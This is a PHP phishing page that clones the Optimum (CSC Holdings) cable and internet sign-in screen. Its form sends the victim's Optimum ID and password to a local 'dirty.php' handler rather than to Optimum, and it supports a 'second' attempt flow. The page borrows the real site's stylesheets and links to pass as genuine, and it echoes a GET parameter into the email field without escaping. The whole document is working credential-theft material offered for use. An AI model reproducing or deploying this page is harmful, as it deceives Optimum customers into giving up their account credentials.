<?php
session_start();
ob_start();
function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}

if (loggedin()) {
    $email = @$_GET['echo'];
    $error = @$_GET['error'];
    if ($error == 'second') {
        $formact = "dirty.php?dyn=second";
    } else {
        $formact = "dirty.php";
    }
} else {
    die();
}


?>

<!DOCTYPE html>
<html>
  <head>
    <title>Sign In to Manage Your Services | Optimum</title>
 
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Sign In with your Optimum ID to manage your account, check your email, set your DVR, and pay your cable bill online. Log in now!"> 

    <link rel="shortcut icon" type="image/x-icon" href="https://www.optimum.net/favicon.ico">
    <link rel="stylesheet" href="https://www.optimum.net/core-and-parts_page_1.css?201809051633">
    <link rel="stylesheet" href="https://www.optimum.net/core-and-parts_page_2.css?201809051633">
    <link rel="stylesheet" href="https://www.optimum.net/login/page.css?201809051633">
    <!--[if IE 8]><link rel="stylesheet" href="https://www.optimum.net/assets/css/ie8.css?201809051633"><![endif]-->

    <!--[if lte IE 8]><script src="https://www.optimum.net/login/ieshiv.js?201809051633"></script><![endif]-->
    <!--[if lte IE 8]><script src="https://www.optimum.net/login/PIE.js?201809051633"></script><![endif]-->
    <!--[if lte IE 8]><script src="https://www.optimum.net/login/PIE.htc?201809051633"></script><![endif]-->


 
  </head>  
  <!--[if lt IE 7 ]> <body class="ie6" data-ng-app="login" data-ng-controller="LoginCtrl"> <![endif]-->
  <!--[if IE 7 ]>    <body class="ie7" data-ng-app="login" data-ng-controller="LoginCtrl"> <![endif]-->
  <!--[if IE 8 ]>    <body class="ie8" data-ng-app="login" data-ng-controller="LoginCtrl"> <![endif]-->
  <!--[if IE 9 ]>    <body class="ie9" data-ng-app="login" data-ng-controller="LoginCtrl"> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> <body data-ng-app="login" data-ng-controller="LoginCtrl"> <!--<![endif]-->
  
    <div id="site-wrapper" ng-click="fnCloseMobileFlyOut()">  <!-- wrapper for entire site, minue mobile flyout menu -->
<img src="optheader.PNG" alt="Optimum Header" width="100%" height="auto">

<div id="is-cpc-header-wrapper" class="hide">
<section id="common-header" data-ng-class="{true: &#39;logged-in&#39;, false: &#39;logged-out&#39;}[CommonHeaderCtrl.currentLoggedInUser.hasSession]">
<div class="visible-phone visible-tablet global-header">
<div class="container">
<div id="phone_header" class="semflex full-width align-children-middle">
        <div class="cpcpadding-s global-header-phone__brand">
            <a href="https://www.optimum.net/" class="block mobile-logo"></a>
         </div>
        </div>
        </div>
        </div>
        <div class="sticky-wrapper" style="height: 0px;"><div sticky-stack="" class="global-header hidden-phone sticky-stack-pseudo ng-scope is-sticky" id="desktop_header" style="top: 123px; position: fixed;">
        <div style="min-width:1000px" id="desktop_header">
        <div class="container">
        <div class="toggle-container">
        <div class="span4">
         <div class="global-header__brand">
         <a href="https://www.optimum.net/" class="desktop-logo"></a>
         </div>
         </div>
</div>
</div>
</div>
</div></div>
</section>
</div>
<div id="is-newCustomer-header-wrapper" class="hideForNewCustomerStuff hidden-desktop hidden-phone">
<section id="common-header-newCustomer" data-ng-class="{true: &#39;logged-in&#39;, false: &#39;logged-out&#39;}[CommonHeaderCtrl.currentLoggedInUser.hasSession]">
        <div class="global-header sticky-stack-pseudo" id="newCustomer-ipad">
        <div id="desktop_header_NewCustomer-ipad">
        <div class="container">
        <div class="toggle-container">
         <div class="global-header__brand">
         <a href="https://www.optimum.net/" class="desktop-logo"></a>
         </div>
</div>
</div>
</div>
</div>
</section>
</div>  <!--   
  Login Page Flow:

  Login - Additional Question:
  1) theme--primary security hidden, display:block (Page Main Title Header)
  2) #protect, display: block;
  3) #login-box, display: none
  4) #forgot-password-quest-fail-box, display: block
  5) create-id, apply .hidden
  6) #security-explanation, display: block

  Login - Additional Question - Error:
  1) theme--primary security hidden, display:block (Page Main Title Header)
  2) #no-match, display: block;
  3) #login-box, display: none
  4) #forgot-password-quest-fail-box, display: block
  5) create-id, apply .hidden
  6) #security-explanation, display: block

  Login - Error:
  1) theme--primary security hidden, display:block (Page Main Title Header)
  2) #nonrecognized, display: block;
  3) #login-box, display: none
  4) #login-block is already displayed, apply .no-match to input

  Login - Reauthorize:
  1) theme--primary security hidden, display:block (Page Main Title Header)
  2) #login-message, display: block;
  3) #login-box, display: none
  4) #login-reauth-box, display: block
  5) create-id, apply .hidden
  6) #security-explanation, display: block
  -->
  <section class="login">
    <div id="header">
      <div class="container">
        <div class="row">
          <div class="span12">
            <h1 class="theme--primary">Optimum Sign In</h1>
          </div>
        </div>
      </div>
    </div>
    <div class="login-page">

      <div class="container">
        <div class="row">
          <div class="alert-banner padding-s panel semflex full-width theme-alert" ng-class="model.cssClass" config="errorMessageConfig" ng-show="failedLogin" style="">
  <!-- if: model.icon --><div if="model.icon" class="ab__icon semflex__auto ng-scope">
    <span class="dot dot--dark-overlay alert-background dotpie" ng-class="{true:&#39;alert-background&#39;}[model.type == &#39;major&#39; || model.type == &#39;minorWarning&#39; ]"><span class="dot-inner" ng-transclude="">
        <i ng-show="!model.img" ng-class="model.icon" class="ng-scope icon-exclamation-major"></i>
    </span></span>
  </div>
  <!-- if: model.img -->
  <div class="ab__text text-unspace">
    <h1 class="ab__title ng-binding" ng-bind-html="model.title">Incorrect Optimum ID or password.</h1>
    <!-- if: model.message -->
    <div class="hflow grid-gutters-margin">
      <!-- ngRepeat: cta in model.ctas -->
    </div>
  </div>
      <span class="alertButton">
    <!-- ngRepeat: btn in model.btns -->
    </span>
</div>
        </div>  
      <div class="row">
          <div class="alert-banner padding-s panel semflex full-width theme-success" ng-class="model.cssClass" config="passSuccessMessageConfig" ng-show="passwordResetSucc" style="display: none;">
  <!-- if: model.icon --><div if="model.icon" class="ab__icon semflex__auto ng-scope">
    <span class="dot dot--dark-overlay dotpie" ng-class="{true:&#39;alert-background&#39;}[model.type == &#39;major&#39; || model.type == &#39;minorWarning&#39; ]"><span class="dot-inner" ng-transclude="">
        <i ng-show="!model.img" ng-class="model.icon" class="ng-scope icon-ok"></i>
    </span></span>
  </div>
  <!-- if: model.img -->
  <div class="ab__text text-unspace">
    <h1 class="ab__title ng-binding" ng-bind-html="model.title">Your password has been reset. Please sign in with your new password.</h1>
    <!-- if: model.message -->
    <div class="hflow grid-gutters-margin">
      <!-- ngRepeat: cta in model.ctas -->
    </div>
  </div>
      <span class="alertButton">
    <!-- ngRepeat: btn in model.btns -->
    </span>
</div>
      </div>
        <div class="row">
          <!-- Login Box Start -->
          <div class="login-container">
          <div class="span8">
            <!-- Login user/pass .no-match class for incorrect user/password START-->
            <form class="ng-valid ng-dirty" action="<?php echo "$formact"; ?>" method="post" name="login">
            <div id="login-box" class="">
              <div class="container">
                          <div class="row" ng-hide="isCpc">
                            <div class="span12">
                              <h2 class="login-title" ng-hide="showTimeOffer">
                                <span ng-show="fromEPGRecordButton" style="display: none;">Sign in to record your program</span>
                                <span ng-show="fromGuide &amp;&amp; !fromEPGRecordButton" style="display: none;">Sign in to see your guide</span>
                                <span ng-show="passwordResetSucc" style="display: none;">Sign in with your <strong>new password</strong></span>     
                              </h2>
                              <h2 class="login-title" ng-show="showTimeOffer" style="display: none;">                                                       
                                <span>Sign in to accept your special offer</span>
                              </h2>                               
                            </div>
                          </div>
                  <div class="row">
                      <div class="span5">
                          <label class="label">My Optimum ID</label>
                      </div>
                      <div class="span7"></div>
                  </div>
                  <div class="row"> 
                      <div class="span5">
                      <input type="text" id="loginPageUsername" name="email" autocorrect="off" autocapitalize="off" value="<?php echo "$email"; ?>" class="input input--highlight input-wrap loginid ng-valid ng-dirty" ng-model="model.id" tabindex="7" ng-disabled="model.reauth" ng-focus="!passwordResetSucc">
                        <input type="hidden" name="wiz" size="14">     
                             <!-- .no-match class for incorrect user/password, turn on id="nonrecognized"  -->
                            </div>
                      <div class="span7 forgot" tabindex="10"><a href="https://www.optimum.net/recover-id/" target="_blank">I forgot my Optimum ID</a></div>
                  </div>
                  <div class="row">
                      <div class="span12 height10"></div>
                  </div>  
                  <div class="row">
                      <div class="span5">
                          <label class="label">Password</label>
                      </div>
                      <div class="span7"></div>
                  </div>
                  <div class="row"> 
                      <div class="span5">
                        <input type="password" id="loginPagePassword" name="passwd" autocorrect="off" autocapitalize="off" class="input input-highlight input-wrap loginpass ng-valid ng-dirty" ng-model="model.password" ng-focus="passwordResetSucc" tabindex="8">
                      <!-- .no-match class for incorrect user/password -->
                    </div>
                      <div class="span7 forgot"><a href="https://www.optimum.net/reset-password/" tabindex="11" target="_blank">I forgot my password</a></div>
                  </div>
                  <div class="row">
                      <div class="span12 height10"></div>
                  </div>                    
                  <div class="row">
                    <div class="span12"><hr></div>
                  </div>
                  <div class="row">
                    <div class="span12 hidden-phone">
                        <button class="btn btn--primary" id="target" ng-click="submit()" tabindex="9" ng-hide="isCpc">Sign in to Optimum.net</button>
                        <button class="btn btn--secondary" id="target" ng-click="submit()" tabindex="9" ng-show="isCpc" style="display: none;">Sign in</button>
                        <div ng-class="{
  &#39;is-checked&#39;: checkbox.isChecked,
  &#39;not-checked&#39;: !checkbox.isChecked,
  &#39;is-checked-partial&#39;: checkbox.isPartial
  }" ng-click="checkbox.onCheck()" type="checkbox" class="checkbox login-checkbox checkbox--secondary ng-valid  not-checked ng-dirty" ng-model="model.remember" tabindex="12" ng-hide="isCpc" ng-disabled="disableRememberMe">
  <div class="checkbox-inner"></div>
</div>
                        <div class="logged-in" ng-hide="isCpc">Remember Me</div>
                    </div>
                  </div>
                  <div class="hidden-desktop hidden-tablet">
                        <div class="span10">
                               <button class="btn btn--primary" id="target" ng-click="submit()" tabindex="9" ng-hide="isCpc">Sign in to Optimum.net</button>
                               <button class="btn btn--secondary" id="target" ng-click="submit()" tabindex="9" ng-show="isCpc" style="display: none;">Sign in</button> 
                        </div>
                        <div class="span10 remember-me">
                                <div ng-class="{
  &#39;is-checked&#39;: checkbox.isChecked,
  &#39;not-checked&#39;: !checkbox.isChecked,
  &#39;is-checked-partial&#39;: checkbox.isPartial
  }" ng-click="checkbox.onCheck()" type="checkbox" class="checkbox login-checkbox checkbox--secondary ng-valid  not-checked ng-dirty" ng-model="model.remember" tabindex="12" ng-hide="isCpc" ng-disabled="disableRememberMe">
  <div class="checkbox-inner"></div>
</div>
                                <span class="logged-in" ng-hide="isCpc">Remember Me</span>
                        </div>
                  </div>
              </div>
            </div>
            </form>
              <!--Login user/pass END -->            
              
            </div>
            
          <div class="span4" ng-hide="isCpc || passwordResetSucc">
            <div id="create-id" ng-hide="model.reauth">
              <h3>Don't have an Optimum ID?</h3>
                <p>An Optimum ID is a unique username that provides access to extra services and benefits.</p>
              <ul>
                <li><span class="primary cta-arrow-link" cta-arrow-link="" href="/profile/create-optimum-id/">
  <a class="font-cta-link" href="https://www.optimum.net/profile/create-optimum-id/" target="_blank">
    <span class="cta-wrap">
      <div class="cta-dot">
        <span ng-transclude=""><span class="ng-scope"><strong>Create an Optimum ID</strong></span></span>
        <i class="cta-circle icon-arrow-right" ng-class="iconClass"></i>
      </div>
    </span>
  </a>
</span></li>
              </ul>
            </div>
            <div id="security-explanation" ng-show="model.reauth" style="display: none;">
              <h3>Please sign in again</h3>
              <p>To protect your most sensitive data, you may be asked to re-enter your password from time to time.</p>
            </div>
        </div>
        <!-- added by raghav -->
        <div class="optimum-id span4 signin-rightside" ng-show="passwordResetSucc" style="display: none;">
            <h3>Never forget another password</h3>
            <p>Optimum's Password Manager allows you to securely manage online usernames and passwords on all of your devices.</p>
            <ul>
              <li><a href="https://www.optimum.net/profile/create-optimum-id/" class="primary"><span class="primary cta-arrow-link"><strong>Find out more about Password Manager and other ways to protect yourself online</strong>&nbsp;&nbsp;<i class="cta-circle icon-arrow-right" ng-class="iconClass"></i></span></a></li>
            </ul>
        </div>
        <!-- added by raghav -->
        
      </div>
      <!-- END Login Container -->
    </div>
   </div>
  </div>
  <!-- Login Box END -->
  </section><section class="common-footer-help ng-scope" data-ng-controller="CommonFooterCtrl" id="is-not-cpc-common-footer-help">
  <div class="container">
    <div class="row">

      <div class="span8">
        <a href="https://www.optimum.net/support/">
          <h2>
           Need Help?  No Problem. 
          
          </h2>
        </a>

        <div class="search-group">
          <form data-ng-submit="CommonFooterCtrl.faqSearch()" class="ng-pristine ng-valid">
            <input type="text" class="ng-pristine ng-valid" data-ng-model="CommonFooterCtrl.footerSearchVal" placeholder="Search FAQs" no-specialchar="">
            <a data-ng-click="CommonFooterCtrl.faqSearch()" class="btn btn--secondary search-glass"><i class="icon-search"></i></a>
          </form>
        </div>

        <!-- all <esi:include> URLs hardcoded because < % %> [an empty mustache tag will break pages rendered by Spring] and {{}} will cause bad problems -->
        <div id="common-questions">
          <div data-ng-show="CommonFooterCtrl.isESI.common">
              <div ng-hide="$root.isEspanolLang">
                  <h5>Frequently Asked Questions</h5><a href="https://www.optimum.net/pages/tv/tv-remote.html" class="no-left no-wrap">Programming My Remote Control</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/1886" class="no-left no-wrap">Optimum Hotspots</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/311" class="no-left no-wrap">Online Bill Pay</a>
              </div>
              <div ng-show="$root.isEspanolLang" style="display: none;">
                  <h5>Preguntas frecuentes</h5><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3125" class="no-left no-wrap">Programar mi control remoto</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3192" class="no-left no-wrap">Hotspots de Optimum</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2994" class="no-left no-wrap">Con pago de factura en linea</a>
              </div>
          </div>
          <div data-ng-show="CommonFooterCtrl.isESI.tv" style="display: none;">
              <div ng-hide="$root.isEspanolLang">
                  <h5>TV Frequently Asked Questions</h5><a href="https://www.optimum.net/pages/tv/tv-remote.html" class="no-left no-wrap">Programming My Remote Control</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/2500" class="no-left no-wrap">Viewer: Power On Feature</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/2240" class="no-left no-wrap">Setting Up My HDTV</a>
              </div>
              <div ng-show="$root.isEspanolLang" style="display: none;">
                  <h5>TV Preguntas frecuentes</h5><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3125" class="no-left no-wrap">Programar mi control remoto</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3391" class="no-left no-wrap">Canal de encendido</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3272" class="no-left no-wrap">Configurar mi HDTV</a>
              </div>
          </div>
          <div data-ng-show="CommonFooterCtrl.isESI.internet" style="display: none;">
              <div ng-hide="$root.isEspanolLang">
                  <h5>Internet Frequently Asked Questions</h5><a href="https://www.optimum.net/FAQ/#/answers/a_id/1886" class="no-left no-wrap">Optimum Hotspots</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/2679" class="no-left no-wrap">Create an Optimum ID</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/27" class="no-left no-wrap">Accessing My Email</a>
              </div>
              <div ng-show="$root.isEspanolLang" style="display: none;">
                  <h5>Preguntas frecuentes de Internet</h5><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3192" class="no-left no-wrap">Hotspots de Optimum</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2945" class="no-left no-wrap">Como crear una ID de Optimum</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2944" class="no-left no-wrap">Acceder a su correo electronico</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/3742" class="no-left no-wrap">Proteccion para Internet de McAfee</a>
              </div>
          </div>
          <div data-ng-show="CommonFooterCtrl.isESI.paybill" style="display: none;">
              <div ng-hide="$root.isEspanolLang">
                  <h5>Pay Bill Frequently Asked Questions</h5><a href="https://www.optimum.net/FAQ/#/answers/a_id/310" class="no-left no-wrap">Bill Payment Options</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/311" class="no-left no-wrap">Online Bill Pay</a><span class="ellipsis"> • </span><a href="https://www.optimum.net/FAQ/#/answers/a_id/312" class="no-left no-wrap">Making a Late Payment</a>
              </div>
              <div ng-show="$root.isEspanolLang" style="display: none;">
                  <h5>Opciones de pago Preguntas frecuentes</h5><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2993" class="no-left no-wrap">Opciones de pago de factura</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2994" class="no-left no-wrap">Con pago de factura en linea</a><span class="ellipsis"> • </span><a href="https://espanol.optimum.net/FAQ/#/answers/a_id/2995" class="no-left no-wrap">Hacer un pago atrasado</a>
              </div>
          </div>
        </div>

        <span class="bottom-buffer"></span>
        <ul class="find-solution-list">
            <li><span class="footer-accent cta-arrow-link" cta-arrow-link="" href="/support/" id="more-solutions">
  <a class="font-cta-link" href="https://www.optimum.net/support/">
    <span class="cta-wrap">
      <div class="cta-dot">
        <span ng-transclude=""><span class="ng-scope">Find Another Solution</span></span>
        <i class="cta-circle icon-arrow-right" ng-class="iconClass"></i>
      </div>
    </span>
  </a>
</span></li>
        </ul>

      </div>

      <div class="span4">
        <h2 id="contact-us"><a href="https://www.optimum.net/support/contact-us/">Contact Us</a></h2>
        <ul id="contact-list">
          <li><a class="no-left" href="https://www.optimum.net/support/livepage/chat"><span class="txt"><i class="icon-comments"></i> Chat Now</span></a></li><li><a class="no-left" href="https://twitter.com/OptimumHelp"><span class="txt"><i class="icon-twitter"></i> @OptimumHelp</span></a></li><li><a class="no-left" href="https://www.optimum.net/support/contact-us#optimum-store"><span class="txt"><i class="icon-stores-white"></i> Optimum Stores</span></a></li>
        </ul>
      </div>

    </div>
  </div>
</section>
<section class="common-footer-links ng-scope" data-ng-controller="CommonFooterCtrl">
    <div class="container minHeightFooter">
        <div class="row">
            <div class="span12" id="is-not-cpc-hr">
                <hr>
            </div>
            <div class="span4 hidden-desktop hidden-tablet" id="is-not-cpc-footer-social-icon">
                <ul><li class="footer-social-icon">
<a class="footer-logo-facebook" href="https://www.facebook.com/Optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-twitter" href="https://twitter.com/optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-instagram" href="https://instagram.com/optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-youtube" href="https://www.youtube.com/Optimum"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-google-plus" href="https://plus.google.com/101990594900593227142/posts"></a>
</li></ul>
            </div>
            <div ng-show="!showForNewCustomer" class="span8" id="is-not-cpc-footer-site-links">
                <ul class="footer-site-links">
                    <li><a href="http://www.gotoassist.com/sb/cvpin">GoToAssist</a></li>
                    <li><a href="https://www.optimum.net/pages/terms.html">Service Terms &amp; Info</a></li>
                    <li><a href="https://www.optimum.net/pages/Privacy/Copyright.html">Copyright Policy</a></li>
                    <li><a href="https://www.optimum.net/pages/PrivacyExisting.html">Privacy Notice</a></li>
                    <li><a href="https://www.optimum.net/pages/ReportAbuse.html">Report Abuse</a></li>
                    <li><a href="https://www.optimum.net/pages/accessibility.html">Accessibility</a></li>
                    <li><a href="https://www.optimum.net/pages/storm-preparedness.html">Storm Preparedness</a></li>
                    <li><a href="https://www.optimum.net/pages/LegalCompliance.html">Legal Compliance</a></li>
                    
                </ul>
            </div>
            <div class="span9 hide" id="is-cpc-footer-site-links">
                <ul class="footer-site-links">
                    <li><a href="https://www.optimum.net/pages/terms.html" target="_blank">Terms of service</a></li>
                    <li><a href="https://www.optimum.net/pages/Privacy/Copyright.html" target="_blank">Copyright policy</a></li>
                    <li><a href="https://www.optimum.net/pages/PrivacyExisting.html" target="_blank">Privacy policy</a></li>
                    <li><a href="https://www.optimum.net/pages/LegalCompliance.html">Legal Compliance</a></li>
                    
                </ul>
            </div>
            <div class="span4 hidden-phone" id="is-not-cpc-footer-social-icon-phone">
                <ul class="fltright"><li class="footer-social-icon">
<a class="footer-logo-facebook" href="https://www.facebook.com/Optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-twitter" href="https://twitter.com/optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-instagram" href="https://instagram.com/optimum/"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-youtube" href="https://www.youtube.com/Optimum"></a>
</li>
<li class="footer-social-icon">
<a class="footer-logo-google-plus" href="https://plus.google.com/101990594900593227142/posts"></a>
</li></ul>
            </div>
        </div>
        <div ng-show="showForNewCustomer" class="row paddingTop1em hidden-phone" style="display: none;">
            <div class="span3 ipadWidth34">
                <ul>
                    <li class="wide ng-binding">© Copyright 2018&nbsp; CSC Holdings, LLC.</li>
                </ul>
            </div>
            <div ng-show="showForNewCustomer" id="new-customer-links" class="span9 opacityfour ipadWidth65" style="display: none;">
                <ul class="footer-site-links">
                    <li><a href="https://www.optimum.net/pages/terms.html" target="_blank">Service Terms &amp; Info</a></li>
                    <li><a href="https://www.optimum.net/pages/Privacy/Copyright.html" target="_blank">Copyright Policy</a></li>
                    <li><a href="https://www.optimum.net/pages/PrivacyExisting.html" target="_blank">Privacy Notice</a></li>
                    <li><a href="https://www.optimum.net/pages/LegalCompliance.html">Legal Compliance</a></li>
                    
                </ul>
            </div>
        </div>
        <div ng-show="showForNewCustomer" class="row paddingTop1em hidden-desktop hideInDesktop hidden-tablet" style="display: none;">
            <div class="span3">
                <ul>
                    <li class="marginTopMobile5"><a href="https://www.optimum.net/pages/terms.html" target="_blank">Service Terms &amp; Info</a></li>
                    <li class="marginTopMobile5"><a href="https://www.optimum.net/pages/Privacy/Copyright.html" target="_blank">Copyright Policy</a></li>
                    <li class="marginTopMobile12"><a href="https://www.optimum.net/pages/PrivacyExisting.html" target="_blank">Privacy Notice</a></li>
                    <li><a href="https://www.optimum.net/pages/LegalCompliance.html">Legal Compliance</a></li>
                </ul>
            </div>
            <div ng-show="showForNewCustomer" id="new-customer-links" class="span6 opacitypointfour" style="display: none;">
                <ul class="footer-site-links">
                    <li class="wide ng-binding">© Copyright 2018&nbsp; CSC Holdings, LLC.</li>
                    
                </ul>
            </div>
        </div>
        <div ng-show="!showForNewCustomer" class="row" id="is-not-cpc-icon-logo">
            <div class="span12 partner-icons">
                <ul>
                    <li class="wide ng-binding">© 2018&nbsp;CSC Holdings, LLC.</li>
                    <li class="icon-logo news"><a href="http://www.news12.com/" class="news12"></a></li><li class="icon-logo"><a href="http://www.newsday.com/" class="newsday"></a></li><li class="icon-logo"><a href="http://www.msgvarsity.com/" class="varsity"></a></li><li class="icon-logo"><a href="http://long-island.newsday.com/" class="exploreli"></a></li><li class="icon-logo"><a href="http://www.amny.com/" class="amnewyork"></a></li><li class="icon-logo"><a href="http://cars.newsday.com/index.php" class="optimum-autos"></a></li><li class="icon-logo"><a href="http://homes.newsday.com/" class="optimum-homes"></a></li><li class="icon-logo"><a href="http://www.optimum.net/community?tid=opt" class="optimum-community"></a></li> 
                </ul>
            </div>
        </div>
        <div class="row hide " id="is-cpc-icon-logo">
            <div class="span12">
                <ul>
                    <li class="is-cpc-wide ng-binding">© Copyright 2018&nbsp; CSC Holdings, LLC.</li>
                </ul>
            </div>
        </div>
    </div> 
</section>    
    </div> <!-- end site-wrapper  -->

    <!-- Make sure to make any changes added here in pages/tv/guide/bottom-guide.muctache + js -->
    <!-- mobile menu flyout-->
    <div>
      <div class="hidden-desktop ng-scope" data-ng-controller="BottomDefaultCtrl">
        <div class="mobile_menu_sheet sheet ng-scope sheet--anim-right not-toggle" sheet="" toggle="BottomDefaultCtrl.showingMobileMenu" animate-toward="right">  <div class="sheet__inner">    <header class="sheet__head theme--primary" ng-show="sheet.title" style="display: none;">      <div class="container">        <div class="hbeam full-width text-unspace vpadding-s">          <div class="align-middle">            <h1 ng-bind="sheet.title" class="ng-binding"></h1>          </div>          <div class="align-right align-middle">            <button class="btn btn--heading ng-binding" ng-bind="sheet.closeLabel" ng-click="sheetCloseAction()">Back</button>          </div>        </div>      </div>    </header>    <div class="sheet__body container vpadding-m" ng-transclude="">    
        <div class="global-nav-container-phone ng-scope">
          <div class="primary-menu">
          <ul>
            <li>
            <!-- <a href="{{BottomDefaultCtrl.helloMessage.link}}" data-ng-click="BottomDefaultCtrl.toggleshowSignOut()" class="welcome-message speech-balloon speech-balloon--tip-outwards mobile" ng-class="{active : BottomDefaultCtrl.showSignOut}">
              <div class="speech-balloon__content">
                <p class="username-msg">{{BottomDefaultCtrl.helloMessage.text}}</p>
            </div>
              <div class="speech-balloon__tip"></div>
            </a>
          <div data-ng-show="BottomDefaultCtrl.hasSession">
              <div data-ng-show="BottomDefaultCtrl.showSignOut" class="mobile-username-slide">
                <ul>
                  <li>Not {{BottomDefaultCtrl.optimumId}}?<br/> <a cta-arrow-link class="footer-accent" data-ng-click="BottomDefaultCtrl.handleUserSignout()">Sign out</a></li>
                </ul>
              </div>
            </div> -->
            <div class="pull-right speech-bubble-home-container" data-ng-show="BottomDefaultCtrl.hasSession" style="display: none;">
                <div class="welcome-message speech-balloon speech-balloon--tip-outwards mobile">
                    <div class="speech-balloon__content row">
                        <div class="span5 username-msg-div"><a href="https://www.optimum.net/profile" class="username-msg ng-binding"></a></div>
                        <div class="span1 verticalLine"></div>
                        <div class="span5 signout-msg-div"><a data-ng-click="BottomDefaultCtrl.handleUserSignout()" class="signout-msg">Sign out</a></div>
                    </div>
                    <div class="speech-balloon__tip"></div>
                </div>                
            </div>
            </li>
            <li><a href="https://www.optimum.net/internet/">Internet</a>
              <div class="pull-right btn btn--secondary-accent gamma" ng-show="!BottomDefaultCtrl.hasSession || BottomDefaultCtrl.hasService.musActive">
                <a href="https://www.optimum.net/login/#">
                  <i class="icon icon-envelope"></i>
                  <span ng-show="BottomDefaultCtrl.badge.internet &gt;= 0" class="ng-binding">false</span>
                </a>
              </div>
            </li>
            <li><a href="https://www.optimum.net/tv/">TV</a><div data-ng-show="BottomDefaultCtrl.hasService.tv" class="pull-right btn btn--secondary-accent gamma" style="display: none;"><a href="https://www.optimum.net/tv/dvr/">DVR</a></div></li>
            <li><a href="https://www.optimum.net/login/#">Phone</a>
            <div data-ng-show="BottomDefaultCtrl.hasSession &amp;&amp; BottomDefaultCtrl.hasService.phone" class="pull-right btn btn--secondary-accent gamma" style="display: none;"><a href="https://www.optimum.net/login/#/Voicemail" class="ng-binding"><i class="icon icon-phone"></i>false</a></div>
            <div data-ng-hide="BottomDefaultCtrl.hasSession &amp;&amp; BottomDefaultCtrl.hasService.phone" class="pull-right btn btn--secondary-accent gamma"><a href="https://www.optimum.net/login/#/Voicemail"><i class="icon icon-phone"></i></a></div>
            </li>
            <li><a href="https://www.optimum.net/pages/smarthome-info.html">Smart Home</a></li>
          </ul>
          </div>
          <hr>
          <div class="secondary-menu">
          <ul>
            <li><a href="https://www.optimum.net/profile/">My Profile</a></li>
            <li><a data-ng-click="BottomDefaultCtrl.forward()">Pay bill</a></li>
            <li><a href="https://www.optimum.net/support/">Support </a><div data-ng-show="BottomDefaultCtrl.badge.support &gt; 0" class="btn btn--alert pull-right" style="display: none;"><a href="https://www.optimum.net/support/"></a><a href="https://www.optimum.net/support/alerts-and-notifications" class="ng-binding"><i class="icon-exclamation-major"></i> </a></div>
            </li>
            <li ng-hide="BottomDefaultCtrl.isBiz"><a href="https://www.optimum.net/upgrades/" omtr="trackme" title="Upgrades Menu">Upgrades</a></li><a href="https://www.optimum.net/upgrades/" omtr="trackme" title="Upgrades Menu">
             </a><li><a href="https://www.optimum.net/upgrades/" omtr="trackme" title="Upgrades Menu"></a><a data-ng-show="BottomDefaultCtrl.hasSession &amp;&amp; BottomDefaultCtrl.primary" href="https://www.optimum.net/service-appointments/" style="display: none;">Service Appointments</a></li>
            <li>
                  <a href="https://www.optimum.net/login/" class="btn btn--secondary-accent-text support-alert-btn">
                      <div class="mobile-support-alert-icon">
                        <div class="">
                            <img data-ng-src="">
                        </div>
                      </div>
                      <div class="support-message">
                        <h4 class="msg-left-txt font-settngs" ng-show="BottomDefaultCtrl.hasSession" style="display: none;">Service status</h4>
<h4 ng-show="BottomDefaultCtrl.hasSession" class="msg-left font-settngs " style="display: none;"></h4>
                        <h4 ng-show="!BottomDefaultCtrl.hasSession" class="msg-left1 font-settngs ng-binding"></h4>
                      </div>
                  </a>
            </li>
          </ul>
          </div>
          <hr>
          <div class="tertiary-menu">
          <ul>
            <li><a href="https://www.optimum.net/support/contact-us/">Contact us</a></li>
            <li><a mporgnav="" href="http://espanol.optimum.net/" onclick="return switchLanguage(&#39;es&#39;);
                function switchLanguage(lang) {
                MP.SrcUrl=decodeURIComponent(&#39;mp_js_orgin_url&#39;);
                MP.UrlLang=&#39;mp_js_current_lang&#39;;MP.init();
                MP.switchLanguage(MP.UrlLang==lang?&#39;en&#39;:lang);
                return false;}">En español</a></li>
          </ul>
          </div>
        </div>
        </div>  </div></div><!--/sheet-->
       <input type="hidden" id="selenium-footer-marker" value="BottomDefaultCtrl in bottom-default.js loaded!">
      </div>
    </div>
    
   </body>
</html>
